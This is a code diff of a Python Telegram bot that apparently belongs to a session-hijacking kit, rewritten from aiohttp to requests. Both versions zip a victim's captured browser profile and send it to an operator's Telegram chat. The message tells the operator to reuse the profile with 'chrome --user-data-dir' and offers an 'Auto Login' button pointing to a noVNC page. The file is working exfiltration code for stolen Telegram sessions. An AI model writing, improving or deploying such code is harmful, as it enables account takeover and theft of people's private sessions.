@@ -1,17 +1,13 @@
 #!/usr/bin/env python3
 """
-Telegram Bot - Clean, single alert with auto-login button
+Telegram Bot - Simple, working alerts
 """
 
-import asyncio
-import aiohttp
+import requests
 import json
 import os
-import zipfile
-import tempfile
 from pathlib import Path
-from typing import Optional, Dict
-from datetime import datetime
+from typing import Optional
 
 
 class TelegramBot:
@@ -19,86 +15,73 @@ class TelegramBot:
         self.bot_token = bot_token
         self.chat_id = chat_id
         self.domain = domain
-        self.base_url = f"https://api.telegram.org/bot{bot_token}" if bot_token else None
-        self.sent: set = set()  # Track sent alerts
+        self.api_url = f"https://api.telegram.org/bot{bot_token}"
+        self.sent: set = set()
     
     @property
     def is_configured(self) -> bool:
         return bool(self.bot_token and self.chat_id)
     
-    async def _api(self, method: str, **kwargs) -> Optional[Dict]:
+    def send_message(self, text: str, buttons: list = None) -> bool:
+        """Send text message"""
         if not self.is_configured:
-            print(f"[TG Bot] Not configured!", flush=True)
-            return None
-        try:
-            url = f"{self.base_url}/{method}"
-            print(f"[TG Bot] API call: {method}", flush=True)
-            async with aiohttp.ClientSession() as session:
-                async with session.post(url, **kwargs) as r:
-                    print(f"[TG Bot] Response: {r.status}", flush=True)
-                    if r.status == 200:
-                        result = await r.json()
-                        print(f"[TG Bot] Success: {result.get('ok', False)}", flush=True)
-                        return result
-                    else:
-                        text = await r.text()
-                        print(f"[TG Bot] Error {r.status}: {text}", flush=True)
-        except Exception as e:
-            print(f"[TG Bot] Exception: {e}", flush=True)
-            import traceback
-            traceback.print_exc()
-        return None
-    
-    async def send(self, text: str, buttons: list = None) -> bool:
+            return False
+        
         payload = {
             "chat_id": self.chat_id,
             "text": text,
             "parse_mode": "HTML",
             "disable_web_page_preview": True
         }
+        
         if buttons:
             payload["reply_markup"] = json.dumps({"inline_keyboard": buttons})
-        return await self._api("sendMessage", json=payload) is not None
+        
+        try:
+            r = requests.post(f"{self.api_url}/sendMessage", json=payload, timeout=10)
+            print(f"[TG] sendMessage: {r.status_code}", flush=True)
+            return r.status_code == 200
+        except Exception as e:
+            print(f"[TG] Error: {e}", flush=True)
+            return False
     
-    async def send_file(self, path: str, caption: str = "", buttons: list = None) -> bool:
-        print(f"[TG Bot] send_file: {path}", flush=True)
-        if not Path(path).exists():
-            print(f"[TG Bot] File not found: {path}", flush=True)
+    def send_file(self, file_path: str, caption: str = "", buttons: list = None) -> bool:
+        """Send file"""
+        if not self.is_configured or not Path(file_path).exists():
             return False
         
-        print(f"[TG Bot] File size: {Path(path).stat().st_size} bytes", flush=True)
-        
-        data = aiohttp.FormData()
-        data.add_field('chat_id', self.chat_id)
-        data.add_field('document', open(path, 'rb'), filename=Path(path).name)
-        if caption:
-            data.add_field('caption', caption)
-            data.add_field('parse_mode', 'HTML')
-        if buttons:
-            data.add_field('reply_markup', json.dumps({"inline_keyboard": buttons}))
-        
-        result = await self._api("sendDocument", data=data)
-        print(f"[TG Bot] send_file result: {result is not None}", flush=True)
-        return result is not None
-
-    async def on_telegram_captured(self, session_id: str, profile_path: str) -> bool:
-        """
-        ONLY alert - Telegram session captured
-        Sends ONE message with auto-login button
-        """
-        print(f"[TG Bot] on_telegram_captured called: {session_id}", flush=True)
-        print(f"[TG Bot] Profile: {profile_path}", flush=True)
-        print(f"[TG Bot] Already sent: {self.sent}", flush=True)
-        
+        try:
+            with open(file_path, 'rb') as f:
+                files = {'document': f}
+                data = {
+                    'chat_id': self.chat_id,
+                    'caption': caption,
+                    'parse_mode': 'HTML'
+                }
+                if buttons:
+                    data['reply_markup'] = json.dumps({"inline_keyboard": buttons})
+                
+                r = requests.post(f"{self.api_url}/sendDocument", files=files, data=data, timeout=30)
+                print(f"[TG] sendDocument: {r.status_code}", flush=True)
+                return r.status_code == 200
+        except Exception as e:
+            print(f"[TG] File error: {e}", flush=True)
+            return False
+    
+    def alert_telegram_session(self, session_id: str, profile_path: str) -> bool:
+        """Send Telegram session alert"""
         if session_id in self.sent:
-            print(f"[TG Bot] Already sent for this session, skipping", flush=True)
             return False
         self.sent.add(session_id)
         
-        # Create zip of the profile
         profile_dir = Path(profile_path)
         if not profile_dir.exists():
+            print(f"[TG] Profile not found: {profile_path}", flush=True)
             return False
+        
+        # Create zip
+        import zipfile
+        import tempfile
         
         with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as tmp:
             zip_path = tmp.name
@@ -109,24 +92,15 @@ class TelegramBot:
                     if f.is_file():
                         zf.write(f, f.relative_to(profile_dir))
             
-            # Clean message with auto-login button
             caption = (
-                "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                "✈️ <b>TELEGRAM SESSION</b>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                "<b>Usage:</b>\n"
-                "1. Extract zip\n"
-                "2. <code>chrome --user-data-dir=./folder</code>\n"
-                "3. Go to web.telegram.org\n"
+                "✈️ <b>TELEGRAM SESSION CAPTURED</b>\n\n"
+                "Extract and use:\n"
+                "<code>chrome --user-data-dir=./folder</code>"
             )
             
-            buttons = [[
-                {"text": "🚀 Auto Login", "url": f"http://{self.domain}:6080/vnc.html"}
-            ]]
+            buttons = [[{"text": "🚀 Auto Login", "url": f"http://{self.domain}:6080/vnc.html"}]]
             
-            return await self.send_file(zip_path, caption, buttons)
-        
+            return self.send_file(zip_path, caption, buttons)
         finally:
             Path(zip_path).unlink(missing_ok=True)
 
